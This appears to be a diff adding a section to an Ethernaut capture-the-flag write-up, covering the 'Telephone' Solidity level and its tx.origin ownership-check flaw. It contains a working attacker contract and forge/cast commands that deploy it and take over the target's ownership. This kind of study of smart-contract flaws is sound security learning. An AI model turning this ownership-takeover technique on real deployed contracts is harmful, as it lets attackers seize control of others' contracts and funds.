@@ -121,3 +121,55 @@ contract CoinFlipAttacker {
 $ cast call 0xdb0DdE6d17A9d17f57238e6CE66328eC5E28C77A "attack()" --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
 ```
 
+# 4: Telephone
+**Link:** [Telephone Challenge](https://ethernaut.openzeppelin.com/level/4)  
+**Bug:** Incorrect ownership validation using `tx.origin`  
+**Objective:** Claim contract ownership  
+**Description:** The contract checks `tx.origin != msg.sender`, which can be bypassed through an intermediary contract.
+
+## 🔍 Vulnerability Analysis
+```solidity
+function changeOwner(address _owner) public {
+  if (tx.origin != msg.sender) {  // Vulnerable check
+    owner = _owner;
+  }
+}
+```
+
+**Steps:**
+ - Deploy an intermediary contract that calls changeOwner()
+ - Trigger the call from your EOA through this contract
+ - Bypass the check because:
+   - tx.origin = Your wallet address 
+   - msg.sender = Attack contract address
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+
+contract TelephoneHack {
+    ITelephone public immutable target;
+
+    constructor(address _target) {
+        target = ITelephone(_target);
+    }
+
+    function attack(address _newOwner) external {
+        target.changeOwner(_newOwner);
+    }
+}
+```
+
+**Execution steps:**
+```shell
+# 1. Deploy attacker contract
+forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+
+# 2. Execute attack (replace $ATTACKER_CONTRACT with deployed address)
+cast send $ATTACKER_CONTRACT "attack(address)" $YOUR_WALLET_ADDRESS \
+  --private-key $PRIVATE_KEY --rpc-url $RPC_URL
+```
